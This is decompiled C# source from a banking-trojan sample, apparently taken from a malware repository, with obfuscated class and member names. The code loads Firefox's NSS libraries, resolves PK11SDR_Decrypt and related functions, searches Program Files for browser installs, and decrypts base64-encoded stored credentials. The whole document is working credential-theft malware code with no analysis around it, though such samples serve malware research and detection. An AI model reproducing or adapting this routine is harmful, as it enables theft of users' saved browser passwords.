// Decompiled with JetBrains decompiler
// Type: p7X.W61
// Assembly: uc5uTlQKZwvBJeUwoIoxWYL1o3uBI8gaMfnT9AO, Version=9.8.6.0, Culture=neutral, PublicKeyToken=null
// MVID: 66B519F9-803D-46C9-8343-EC24850CA08A
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.01-msil\HEUR-Trojan-Banker.MSIL.ClipBanker.gen-de0d24df79f99286da0234aa1536470d7596c53e531173d693d6ccc60b98e84c.exe

using \u00329X;
using I5O;
using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;

namespace p7X
{
  internal static class W61
  {
    private static IntPtr \u0036UN;
    private static IntPtr t2f;
    private static \u0034NP.V1e \u003746;
    private static \u0034NP.\u003749 BnH;
    private static \u0034NP.xpV PT6;

    public static bool \u0031M8([In] string obj0)
    {
      try
      {
        W61.t2f = ezl.\u0032V5(obj0 + "\\mozglue.dll");
        W61.\u0036UN = ezl.\u0032V5(obj0 + "\\nss3.dll");
        IntPtr ptr1 = ezl.A82(W61.\u0036UN, "NSS_Init");
        IntPtr ptr2 = ezl.A82(W61.\u0036UN, "PK11SDR_Decrypt");
        IntPtr ptr3 = ezl.A82(W61.\u0036UN, "NSS_Shutdown");
        W61.\u003746 = (\u0034NP.V1e) Marshal.GetDelegateForFunctionPointer(ptr1, typeof (\u0034NP.V1e));
        W61.BnH = (\u0034NP.\u003749) Marshal.GetDelegateForFunctionPointer(ptr2, typeof (\u0034NP.\u003749));
        W61.PT6 = (\u0034NP.xpV) Marshal.GetDelegateForFunctionPointer(ptr3, typeof (\u0034NP.xpV));
        return true;
      }
      catch
      {
        return false;
      }
    }

    public static void \u003637()
    {
      long num = W61.PT6();
      ezl.\u003355(W61.\u0036UN);
      ezl.\u003355(W61.t2f);
    }

    public static string[] F53()
    {
      List<string> stringList = new List<string>((IEnumerable<string>) Directory.GetDirectories(Environment.GetEnvironmentVariable("ProgramFiles")));
      if (8 == IntPtr.Size || !string.IsNullOrEmpty(Environment.GetEnvironmentVariable("PROCESSOR_ARCHITEW6432")))
        stringList.AddRange((IEnumerable<string>) Directory.GetDirectories(Environment.GetEnvironmentVariable("ProgramFiles(x86)")));
      return stringList.ToArray();
    }

    public static bool \u003956([In] string obj0) => W61.\u003746(obj0) == 0L;

    public static string sra([In] string obj0)
    {
      IntPtr num = IntPtr.Zero;
      try
      {
        byte[] source = Convert.FromBase64String(obj0);
        num = Marshal.AllocHGlobal(source.Length);
        Marshal.Copy(source, 0, num, source.Length);
        \u0034NP.l1V l1V = new \u0034NP.l1V();
        if (W61.BnH(ref new \u0034NP.l1V()
        {
          \u0032X4 = 0,
          V21 = num,
          xl3 = source.Length
        }, ref l1V, 0) == 0)
        {
          if (l1V.xl3 != 0)
          {
            byte[] numArray = new byte[l1V.xl3];
            Marshal.Copy(l1V.V21, numArray, 0, l1V.xl3);
            return Encoding.UTF8.GetString(numArray);
          }
        }
      }
      catch
      {
        return (string) null;
      }
      finally
      {
        if (num != IntPtr.Zero)
          Marshal.FreeHGlobal(num);
      }
      return (string) null;
    }
  }
}
